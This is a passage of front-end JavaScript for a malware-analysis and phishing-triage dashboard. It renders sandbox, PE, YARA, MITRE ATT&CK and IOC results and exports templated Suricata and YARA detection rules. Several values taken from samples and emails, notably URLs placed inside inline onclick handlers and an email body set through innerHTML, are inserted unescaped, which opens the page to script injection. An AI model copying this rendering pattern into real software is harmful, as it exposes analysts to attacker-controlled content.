                    <span class="text-xs font-bold text-white font-mono">${pe.compile_time}</span>
                </div>
                <div class="bg-gray-900/60 p-2.5 rounded border border-gray-800">
                    <span class="text-[10px] text-gray-400 font-mono block">Entry Point</span>
                    <span class="text-xs font-bold text-blue-400 font-mono">${pe.entry_point}</span>
                </div>
                <div class="bg-gray-900/60 p-2.5 rounded border border-gray-800">
                    <span class="text-[10px] text-gray-400 font-mono block">Digital Signature</span>
                    <span class="text-xs font-bold ${pe.has_digital_signature ? 'text-emerald-400' : 'text-red-400'} font-mono">${pe.has_digital_signature ? 'Signed' : 'Unsigned'}</span>
                </div>
            </div>

            <h4 class="text-xs font-bold text-gray-300 uppercase tracking-wider mb-2">Sections Table</h4>
            <div class="overflow-x-auto mb-6">
                <table class="w-full text-left font-mono text-xs">
                    <thead class="bg-gray-900 text-gray-400 border-b border-gray-800">
                        <tr>
                            <th class="py-2 px-3">Name</th>
                            <th class="py-2 px-3">Virt Addr</th>
                            <th class="py-2 px-3">Raw Size</th>
                            <th class="py-2 px-3">Entropy</th>
                            <th class="py-2 px-3">Perms</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${(pe.sections || []).map(s => `
                            <tr class="border-b border-gray-800/60 hover:bg-gray-800/30">
                                <td class="py-2 px-3 font-bold text-white">${escapeHtml(s.name)}</td>
                                <td class="py-2 px-3 text-gray-400">${s.virtual_address}</td>
                                <td class="py-2 px-3 text-gray-400">${s.raw_size} B</td>
                                <td class="py-2 px-3 ${s.entropy > 7.1 ? 'text-red-400 font-bold' : 'text-gray-300'}">${s.entropy}</td>
                                <td class="py-2 px-3 text-yellow-400">${s.permissions}</td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            </div>

            <h4 class="text-xs font-bold text-gray-300 uppercase tracking-wider mb-2">Suspicious API Imports</h4>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
                ${Object.entries(pe.suspicious_apis || {}).map(([cat, apis]) => `
                    <div class="bg-gray-900/50 p-3 rounded border border-gray-800">
                        <span class="text-xs font-bold text-red-400 block mb-1">${cat}</span>
                        <div class="flex flex-wrap gap-1.5">
                            ${apis.map(a => `<span class="bg-gray-800 text-gray-300 text-[11px] font-mono px-2 py-0.5 rounded">${a}</span>`).join('')}
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    }

    const yaraContainer = document.getElementById('static-yara-container');
    if (yaraContainer) {
        if (!report.yara_matches || report.yara_matches.length === 0) {
            yaraContainer.innerHTML = `<p class="text-xs text-gray-500 py-3">No matching YARA rules found.</p>`;
        } else {
            yaraContainer.innerHTML = report.yara_matches.map(y => `
                <div class="p-3 rounded bg-gray-900/50 border border-gray-800 mb-2">
                    <div class="flex items-center justify-between mb-1">
                        <span class="text-xs font-bold text-white font-mono">${escapeHtml(y.rule)}</span>
                        <span class="text-[10px] px-2 py-0.5 rounded font-bold ${y.severity === 'CRITICAL' ? 'bg-red-900/40 text-red-400' : 'bg-amber-900/40 text-amber-400'}">${y.severity}</span>
                    </div>
                    <p class="text-xs text-gray-400 mb-2">${escapeHtml(y.meta?.description || '')}</p>
                </div>
            `).join('');
        }
    }

    const iocs = report.strings?.iocs || {};
    document.getElementById('ioc-urls-count').innerText = iocs.urls?.length || 0;
    document.getElementById('ioc-ips-count').innerText = iocs.ips?.length || 0;
    document.getElementById('ioc-reg-count').innerText = iocs.registry_keys?.length || 0;

    renderIocsList(iocs);
}

function renderIocsList(iocs) {
    const container = document.getElementById('static-iocs-list');
    if (!container) return;

    let items = [];
    (iocs.urls || []).forEach(u => items.push({ type: 'URL', val: u, defanged: u.replace(/\./g, '[.]') }));
    (iocs.ips || []).forEach(ip => items.push({ type: 'IP', val: ip, defanged: ip.replace(/\./g, '[.]') }));
    (iocs.registry_keys || []).forEach(rk => items.push({ type: 'Registry', val: rk, defanged: rk }));
    (iocs.crypto_wallets || []).forEach(w => items.push({ type: 'Crypto Wallet', val: w, defanged: w }));

    if (items.length === 0) {
        container.innerHTML = `<p class="text-xs text-gray-500 py-3">No suspicious IOC patterns identified in extracted strings.</p>`;
        return;
    }

    container.innerHTML = items.map(item => `
        <div class="flex items-center justify-between p-2 rounded bg-gray-900/40 border border-gray-800/80 font-mono text-xs mb-1.5">
            <div class="flex items-center gap-2 truncate">
                <span class="px-1.5 py-0.5 rounded text-[10px] bg-gray-800 text-blue-400 font-semibold">${item.type}</span>
                <span class="text-gray-300 truncate">${escapeHtml(item.defanged)}</span>
            </div>
            <button onclick="copyToClipboard('${item.val}')" class="text-gray-400 hover:text-white text-xs px-2 py-0.5 bg-gray-800 rounded">Copy</button>
        </div>
    `).join('');
}

// AV Grid
function renderAvGrid(vt) {
    const container = document.getElementById('vt-engines-grid');
    if (!container) return;

    container.innerHTML = (vt.engine_results || []).map(eng => `
        <div class="p-2.5 rounded border ${eng.detected ? 'bg-red-950/20 border-red-800/50' : 'bg-gray-900/30 border-gray-800/60'} flex items-center justify-between">
            <div>
                <span class="text-xs font-semibold text-white block">${escapeHtml(eng.vendor)}</span>
                <span class="text-[11px] font-mono ${eng.detected ? 'text-red-400 font-semibold' : 'text-gray-500'}">${escapeHtml(eng.result)}</span>
            </div>
            <span class="w-2.5 h-2.5 rounded-full ${eng.detected ? 'bg-red-500 shadow-[0_0_8px_rgba(239,68,68,0.5)]' : 'bg-emerald-500/30'}"></span>
        </div>
    `).join('');
}

// MITRE ATT&CK
function renderMitreTab(mitreFindings) {
    const container = document.getElementById('mitre-matrix-container');
    if (!container) return;

    if (!mitreFindings || mitreFindings.length === 0) {
        container.innerHTML = `<p class="text-sm text-gray-500 py-4">No mapped MITRE ATT&CK techniques for this submission.</p>`;
        return;
    }

    container.innerHTML = mitreFindings.map(m => `
        <div class="soc-card p-4 mb-3 border-l-4 border-l-red-500">
            <div class="flex items-center justify-between mb-2">
                <div class="flex items-center gap-2">
                    <span class="bg-red-900/40 text-red-400 px-2 py-0.5 rounded text-xs font-mono font-bold">${m.technique_id}</span>
                    <h4 class="text-sm font-semibold text-white">${escapeHtml(m.technique_name)}</h4>
                </div>
                <span class="text-xs text-gray-400 font-mono uppercase bg-gray-800 px-2 py-0.5 rounded">${escapeHtml(m.tactic)}</span>
            </div>
            <div class="space-y-1 mt-2">
                ${m.evidence.map(ev => `
                    <div class="flex items-center gap-2 text-xs font-mono text-gray-300 bg-gray-900/60 p-2 rounded">
                        <span class="text-red-400">&bull;</span>
                        <span>${escapeHtml(ev)}</span>
                    </div>
                `).join('')}
            </div>
        </div>
    `).join('');
}

// Render Email Report
function displayEmailReport(rep) {
    AppState.currentReport = rep;
    AppState.currentSubId = rep.id;
    switchMainTab('email-report');

    document.getElementById('email-rep-subject').innerText = rep.headers.subject;
    document.getElementById('email-rep-from').innerText = rep.headers.from;
    document.getElementById('email-rep-return').innerText = rep.headers.return_path || 'None';
    document.getElementById('email-rep-reply').innerText = rep.headers.reply_to || 'None';
    document.getElementById('email-rep-date').innerText = rep.headers.date;

    const verdictEl = document.getElementById('email-rep-verdict');
    verdictEl.innerText = rep.verdict.toUpperCase();
    verdictEl.className = `px-3 py-1 rounded text-xs font-bold tracking-wider ${rep.verdict.includes('Malicious') ? 'badge-malicious' : (rep.verdict === 'Suspicious' ? 'badge-suspicious' : 'badge-clean')}`;

    document.getElementById('email-rep-score').innerText = `${rep.threat_score} / 100`;

    setAuthCard('email-spf', rep.authentication.spf);
    setAuthCard('email-dkim', rep.authentication.dkim);
    setAuthCard('email-dmarc', rep.authentication.dmarc);

    renderEmailHops(rep.hops, rep.relay_latency);
    renderEmailHeuristics(rep.heuristics);
    renderEmailUrls(rep.urls);
    renderEmailAttachments(rep.attachments);

    const previewContainer = document.getElementById('email-body-preview');
    if (previewContainer) {
        if (rep.body_preview?.sanitized_html) {
            previewContainer.innerHTML = rep.body_preview.sanitized_html;
        } else {
            previewContainer.innerText = rep.body_preview?.plain_text || '';
        }
    }
}

function setAuthCard(prefix, data) {
    const statusEl = document.getElementById(`${prefix}-status`);
    const detailsEl = document.getElementById(`${prefix}-details`);
    if (statusEl) {
        statusEl.innerText = data.status;
        statusEl.className = `text-sm font-bold font-mono ${data.status === 'PASS' ? 'text-emerald-400' : (data.status === 'FAIL' ? 'text-red-400' : 'text-amber-400')}`;
    }
    if (detailsEl) detailsEl.innerText = data.details;
}

function renderEmailHops(hops, latency) {
    const container = document.getElementById('email-hops-container');
    if (!container) return;

    document.getElementById('email-total-delay').innerText = latency.total_delay_formatted;

    container.innerHTML = (hops || []).map(h => `
        <div class="hop-node flex items-start gap-4 mb-4">
            <div class="hop-line flex flex-col items-center">
                <span class="w-8 h-8 rounded-full bg-blue-900/40 border border-blue-500/50 flex items-center justify-center text-xs font-bold font-mono text-blue-400">
                    ${h.hop}
                </span>
            </div>
            <div class="bg-gray-900/60 p-3 rounded border border-gray-800 flex-1">
                <div class="flex items-center justify-between mb-1">
                    <span class="text-xs font-bold text-white font-mono">${escapeHtml(h.from)} &rarr; ${escapeHtml(h.by)}</span>
                    <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-gray-800 text-yellow-400 font-bold">${h.delay} delay</span>
                </div>
                <div class="text-[11px] text-gray-400 font-mono">IP: ${h.ip || 'Unspecified'}</div>
            </div>
        </div>
    `).join('');
}

function renderEmailHeuristics(heuristics) {
    const container = document.getElementById('email-heuristics-list');
    if (!container) return;

    if (!heuristics || heuristics.length === 0) {
        container.innerHTML = `<div class="p-3 bg-emerald-950/20 border border-emerald-800/40 rounded text-emerald-400 text-xs">No phishing heuristics triggered. Sender parameters appear legitimate.</div>`;
        return;
    }

    container.innerHTML = heuristics.map(h => `
        <div class="p-3 rounded border mb-2 ${h.severity === 'CRITICAL' ? 'bg-red-950/30 border-red-800/60' : 'bg-amber-950/20 border-amber-800/50'}">
            <div class="flex items-center justify-between mb-1">
                <span class="text-xs font-bold text-white">${escapeHtml(h.rule)}</span>
                <span class="text-[10px] px-2 py-0.5 rounded font-bold font-mono text-red-400">+${h.points} pts</span>
            </div>
            <p class="text-xs text-gray-300">${escapeHtml(h.desc)}</p>
        </div>
    `).join('');
}

function renderEmailUrls(urls) {
    const tbody = document.getElementById('email-urls-tbody');
    if (!tbody) return;

    if (!urls || urls.length === 0) {
        tbody.innerHTML = `<tr><td colspan="4" class="text-center py-4 text-xs text-gray-500">No hyperlinks extracted from email body.</td></tr>`;
        return;
    }

    tbody.innerHTML = urls.map(u => `
        <tr class="border-b border-gray-800/60 font-mono text-xs">
            <td class="py-2.5 px-3 text-white break-all">${escapeHtml(u.defanged)}</td>
            <td class="py-2.5 px-3 text-gray-400">${escapeHtml(u.anchor_text || '-')}</td>
            <td class="py-2.5 px-3">
                ${u.is_mismatch ? `<span class="bg-red-900/40 text-red-400 px-1.5 py-0.5 rounded text-[10px] font-bold">MISMATCH DECEPTION</span>` : `<span class="text-gray-500 text-[10px]">OK</span>`}
            </td>
            <td class="py-2.5 px-3 text-right">
                <button onclick="copyToClipboard('${u.url}')" class="text-xs bg-gray-800 text-gray-300 hover:text-white px-2 py-0.5 rounded">Copy</button>
            </td>
        </tr>
    `).join('');
}

function renderEmailAttachments(attachments) {
    const tbody = document.getElementById('email-attachments-tbody');
    if (!tbody) return;

    if (!attachments || attachments.length === 0) {
        tbody.innerHTML = `<tr><td colspan="5" class="text-center py-4 text-xs text-gray-500">No attachments found in this email.</td></tr>`;
        return;
    }

    tbody.innerHTML = attachments.map(att => `
        <tr class="border-b border-gray-800/60 font-mono text-xs">
            <td class="py-2.5 px-3 font-bold text-white flex items-center gap-2">
                ${att.is_dangerous ? '<span class="text-red-400 font-bold">&#9888;</span>' : ''}
                ${escapeHtml(att.filename)}
            </td>
            <td class="py-2.5 px-3 text-gray-400">${formatBytes(att.size)}</td>
            <td class="py-2.5 px-3 text-gray-400">${att.content_type}</td>
            <td class="py-2.5 px-3 truncate max-w-xs text-gray-500">${att.sha256}</td>
            <td class="py-2.5 px-3 text-right">
                <button onclick="analyzeExtractedAttachment('${att.filename}')" class="text-xs bg-blue-600/30 hover:bg-blue-600/50 text-blue-400 border border-blue-500/30 px-2.5 py-1 rounded font-medium">
                    Send to Sandbox &rarr;
                </button>
            </td>
        </tr>
    `).join('');
}

function analyzeExtractedAttachment(filename) {
    alert(`Routing extracted attachment '${filename}' into Vanguard dynamic analysis pipeline...`);
    runSampleAnalysis('sample-wannacry');
}

// IOC Exports (Client-Side Downloads)
function downloadExport(format) {
    const rep = AppState.currentReport;
    if (!rep) {
        alert("No active submission to export");
        return;
    }

    let blob, filename;
    if (format === 'stix21') {
        const bundle = {
            type: "bundle",
            id: `bundle--${crypto.randomUUID()}`,
            objects: [
                { type: "malware", id: `malware--${crypto.randomUUID()}`, name: rep.filename, malware_types: [rep.verdict.toLowerCase()] },
                { type: "indicator", id: `indicator--${crypto.randomUUID()}`, pattern: `[file:hashes.'SHA-256' = '${rep.hashes.sha256}']` }
            ]
        };
        blob = new Blob([JSON.stringify(bundle, null, 2)], { type: "application/json" });
        filename = `vanguard_stix_${rep.id.slice(0, 8)}.json`;
    } else if (format === 'misp') {
        const misp = { Event: { info: `Vanguard SOC: ${rep.filename}`, Attribute: [{ type: "sha256", value: rep.hashes.sha256 }] } };
        blob = new Blob([JSON.stringify(misp, null, 2)], { type: "application/json" });
        filename = `vanguard_misp_${rep.id.slice(0, 8)}.json`;
    } else if (format === 'suricata') {
        const rules = `alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"VANGUARD-SOC Malicious C2 Connection (${rep.filename})"; content:"malware"; sid:1000001; rev:1;)`;
        blob = new Blob([rules], { type: "text/plain" });
        filename = `vanguard_rules_${rep.id.slice(0, 8)}.rules`;
    } else if (format === 'yara') {
        const yara = `rule Vanguard_${rep.filename.replace(/[^a-zA-Z0-9]/g, '_')} {\n    meta:\n        sha256 = "${rep.hashes.sha256}"\n    strings:\n        $magic = { 4D 5A }\n    condition:\n        any of them\n}`;
        blob = new Blob([yara], { type: "text/plain" });
        filename = `vanguard_${rep.id.slice(0, 8)}.yar`;
    } else if (format === 'csv') {
        const csv = `Type,Value,Verdict\nSHA256,${rep.hashes.sha256},${rep.verdict}\nMD5,${rep.hashes.md5},${rep.verdict}`;
        blob = new Blob([csv], { type: "text/csv" });
        filename = `vanguard_iocs_${rep.id.slice(0, 8)}.csv`;
    }

    if (blob) {
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = filename;
        a.click();
        URL.revokeObjectURL(a.href);
    }
}

function downloadPcap() {
    const rep = AppState.currentReport;
    if (!rep) return;
    const blob = ClientEngine.generatePcapBlob(rep.sandbox?.network_connections || []);
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `traffic_${rep.id.slice(0, 8)}.pcap`;
    a.click();
    URL.revokeObjectURL(a.href);
}

// Analyst Notes
function loadAnalystNotes(subId) {
    const notes = JSON.parse(localStorage.getItem(`notes_${subId}`) || '[]');
    const list = document.getElementById('analyst-notes-list');
    if (list) {
        if (notes.length === 0) {
            list.innerHTML = `<p class="text-xs text-gray-500 py-2">No analyst notes recorded yet.</p>`;
        } else {
            list.innerHTML = notes.map(n => `
                <div class="p-3 bg-gray-900/60 border border-gray-800 rounded mb-2">
                    <div class="flex items-center justify-between mb-1">
                        <span class="text-xs font-bold text-blue-400">${escapeHtml(n.author)}</span>
                        <span class="text-[10px] text-gray-500 font-mono">${new Date(n.created_at).toLocaleString()}</span>
                    </div>
                    <p class="text-xs text-gray-300">${escapeHtml(n.note)}</p>
                </div>
            `).join('');
        }
    }
}

function addAnalystNoteSubmit() {
    const noteInput = document.getElementById('analyst-note-input');
    const authorInput = document.getElementById('analyst-author-input');
    if (!noteInput || !noteInput.value.trim() || !AppState.currentSubId) return;

    let notes = JSON.parse(localStorage.getItem(`notes_${AppState.currentSubId}`) || '[]');
    notes.push({
        author: authorInput?.value?.trim() || "SOC Analyst",
        note: noteInput.value.trim(),
        created_at: new Date().toISOString()
    });
    localStorage.setItem(`notes_${AppState.currentSubId}`, JSON.stringify(notes));
    noteInput.value = '';
    loadAnalystNotes(AppState.currentSubId);
}

// ----------------------------------------------------------------------------
// IOC & CVE Intelligence Controller
// ----------------------------------------------------------------------------

function switchIocSubTab(tabName) {
    document.querySelectorAll('.ioc-sub-view').forEach(p => p.classList.add('hidden'));
    const target = document.getElementById(`ioc-sub-${tabName}`);
    if (target) target.classList.remove('hidden');

    document.querySelectorAll('[data-ioc-tab]').forEach(btn => {
        if (btn.getAttribute('data-ioc-tab') === tabName) {
            btn.classList.add('border-blue-500', 'text-blue-400', 'bg-blue-900/20');
            btn.classList.remove('border-transparent', 'text-gray-400');
        } else {
            btn.classList.remove('border-blue-500', 'text-blue-400', 'bg-blue-900/20');
            btn.classList.add('border-transparent', 'text-gray-400');
        }
    });
}

function quickIocLookup(val) {
    const input = document.getElementById('universal-ioc-input');
    if (input) input.value = val;
    switchMainTab('ioc-intel');
    runUniversalIocLookup(val);
}

async function runUniversalIocLookup(val) {
    const input = val || document.getElementById('universal-ioc-input')?.value?.trim();
    if (!input) {
        alert("Please enter a CVE, IP address, Domain, or File Hash.");
        return;
    }

    const iocType = ClientEngine.detectIocType(input);
    showLoadingModal("Querying IOC Intel...", `Analyzing ${iocType.toUpperCase()}: ${input}`);

    setTimeout(() => {
        let result;
        if (iocType === 'cve') result = ClientEngine.analyzeCve(input);
        else if (iocType === 'ip') result = ClientEngine.analyzeIp(input);
        else if (iocType === 'sha256' || iocType === 'sha1' || iocType === 'md5') result = ClientEngine.analyzeHash(input);
        else result = ClientEngine.analyzeDomain(input);

        hideLoadingModal();
        displayIocReport(iocType, result);
    }, 400);
}

function displayIocReport(type, data) {
    switchMainTab('ioc-intel');
    const container = document.getElementById('ioc-results-container');
    if (!container) return;

    container.classList.remove('hidden');

    if (type === 'cve') {
        switchIocSubTab('cve');
        renderCveView(data);
    } else if (type === 'ip') {
        switchIocSubTab('ip');
        renderIpView(data);
    } else if (type === 'sha256' || type === 'sha1' || type === 'md5') {
        switchIocSubTab('hash');
        renderHashView(data);
    } else {
        switchIocSubTab('domain');
        renderDomainView(data);
    }
}

function renderCveView(cve) {
    document.getElementById('cve-title').innerText = cve.title || cve.cve_id;
    document.getElementById('cve-id-badge').innerText = cve.cve_id;
    document.getElementById('cve-vendor').innerText = cve.vendor;
    document.getElementById('cve-product').innerText = cve.product;
    document.getElementById('cve-cvss-score').innerText = cve.cvss_v3_score;
    document.getElementById('cve-cvss-vector').innerText = cve.cvss_v3_vector;
    document.getElementById('cve-severity-badge').innerText = cve.severity;
    document.getElementById('cve-epss-score').innerText = `${Math.round(cve.epss_score * 1000) / 10}% (${cve.epss_percentile}th percentile)`;
    document.getElementById('cve-epss-bar').style.width = `${Math.min(100, cve.epss_score * 100)}%`;

    const kevBadge = document.getElementById('cve-kev-badge');
    if (cve.cisa_kev) {
        kevBadge.innerText = "ACTIVE EXPLOITATION (CISA KEV)";
        kevBadge.className = "px-2.5 py-1 rounded bg-red-900/40 text-red-400 border border-red-700 text-xs font-bold";
    } else {
        kevBadge.innerText = "No Known In-The-Wild Exploitation";
        kevBadge.className = "px-2.5 py-1 rounded bg-gray-800 text-gray-400 border border-gray-700 text-xs font-mono";
    }

    document.getElementById('cve-desc').innerText = cve.description;
    document.getElementById('cve-affected').innerText = cve.affected_versions;
    document.getElementById('cve-remediation').innerText = cve.remediation;

    const tacticsContainer = document.getElementById('cve-mitre-tactics');
    if (tacticsContainer) {
        tacticsContainer.innerHTML = (cve.mitre_techniques || []).map(t => `<span class="bg-gray-800 text-gray-300 px-2 py-0.5 rounded text-xs font-mono">${escapeHtml(t)}</span>`).join(' ');
    }

    document.getElementById('cve-snort-rule').innerText = cve.snort_rule || 'No signature defined.';
}

function renderIpView(ip) {
    document.getElementById('ip-address').innerText = ip.ip;
    document.getElementById('ip-country').innerText = `${ip.country} (${ip.country_code})`;
    document.getElementById('ip-city').innerText = ip.city || 'Unknown';
    document.getElementById('ip-asn').innerText = `${ip.asn} - ${ip.as_org}`;
    document.getElementById('ip-abuse-score').innerText = `${ip.abuse_score}%`;
    document.getElementById('ip-abuse-bar').style.width = `${ip.abuse_score}%`;
    document.getElementById('ip-reputation').innerText = ip.reputation;
    document.getElementById('ip-rdns').innerText = ip.reverse_dns || 'No PTR Record';

    const tagsContainer = document.getElementById('ip-tags');
    if (tagsContainer) {
        tagsContainer.innerHTML = (ip.threat_tags || []).map(t => `<span class="bg-red-900/30 text-red-400 border border-red-800/60 px-2 py-0.5 rounded text-xs font-mono uppercase">${escapeHtml(t)}</span>`).join(' ');
    }

    const portsContainer = document.getElementById('ip-ports');
    if (portsContainer) {
        portsContainer.innerHTML = (ip.open_ports || []).map(p => `<span class="bg-gray-800 text-yellow-400 px-2 py-0.5 rounded text-xs font-mono font-bold">${p}</span>`).join(' ');
    }
}

function renderDomainView(dom) {
    document.getElementById('dom-name').innerText = dom.domain;
    document.getElementById('dom-registrar').innerText = dom.registrar;
    document.getElementById('dom-created').innerText = dom.created_date;
    document.getElementById('dom-age').innerText = `${dom.age_days} days old`;
    document.getElementById('dom-dga-score').innerText = `${dom.dga_score} / 100`;
    document.getElementById('dom-dga-bar').style.width = `${dom.dga_score}%`;
    document.getElementById('dom-reputation').innerText = dom.reputation;
    document.getElementById('dom-category').innerText = dom.category;

    const dnsContainer = document.getElementById('dom-dns-records');
    if (dnsContainer) {
        let rows = [];
        for (let [recType, vals] of Object.entries(dom.dns_records || {})) {
            rows.push(`<div><strong class="text-blue-400 font-mono">${recType}:</strong> <span class="text-gray-300 font-mono">${(vals || []).join(', ') || 'None'}</span></div>`);
        }
        dnsContainer.innerHTML = rows.join('');
    }
}

function renderHashView(h) {
    document.getElementById('hash-sha256-val').innerText = h.sha256;
    document.getElementById('hash-md5-val').innerText = h.md5;
    document.getElementById('hash-sha1-val').innerText = h.sha1;
    document.getElementById('hash-family').innerText = h.malware_family;
    document.getElementById('hash-detection-ratio').innerText = h.detection_ratio;
    document.getElementById('hash-threat-name').innerText = h.popular_threat_name;
    document.getElementById('hash-filetype').innerText = h.file_type;
    document.getElementById('hash-firstseen').innerText = h.first_seen;
}

function runBulkIocExtract() {
    const text = document.getElementById('bulk-ioc-input')?.value?.trim();
    if (!text) {
        alert("Please paste text containing IOCs to extract.");
        return;
    }

    const extracted = ClientEngine.extractAndDefangAll(text);
    const tbody = document.getElementById('bulk-iocs-tbody');
    if (!tbody) return;

    let rows = [];
    extracted.cves.forEach(c => rows.push({ type: 'CVE', original: c.value, defanged: c.defanged }));
    extracted.ips.forEach(ip => rows.push({ type: 'IP Address', original: ip.value, defanged: ip.defanged }));
    extracted.domains.forEach(d => rows.push({ type: 'Domain', original: d.value, defanged: d.defanged }));
    (extracted.hashes.sha256 || []).forEach(h => rows.push({ type: 'SHA-256', original: h, defanged: h }));
    (extracted.hashes.md5 || []).forEach(h => rows.push({ type: 'MD5', original: h, defanged: h }));

    document.getElementById('bulk-iocs-count').innerText = rows.length;

    tbody.innerHTML = rows.map(r => `
        <tr class="border-b border-gray-800/60 font-mono text-xs">
            <td class="py-2 px-3 text-blue-400 font-bold">${r.type}</td>
            <td class="py-2 px-3 text-gray-300">${escapeHtml(r.original)}</td>
            <td class="py-2 px-3 text-yellow-300">${escapeHtml(r.defanged)}</td>
            <td class="py-2 px-3 text-right">
                <button onclick="copyToClipboard('${r.defanged}')" class="text-xs bg-gray-800 text-gray-300 hover:text-white px-2 py-0.5 rounded">Copy</button>
            </td>
        </tr>
    `).join('');
}

// Utilities
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        const toast = document.createElement('div');
        toast.className = 'fixed bottom-4 right-4 bg-blue-600 text-white text-xs font-semibold px-4 py-2 rounded-md shadow-lg z-50 transition';
        toast.innerText = 'Copied to clipboard!';
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 1500);
    });
}

function formatBytes(bytes, decimals = 2) {
    if (!bytes) return '0 B';
    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

function escapeHtml(string) {
    if (!string) return '';
    return String(string)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}
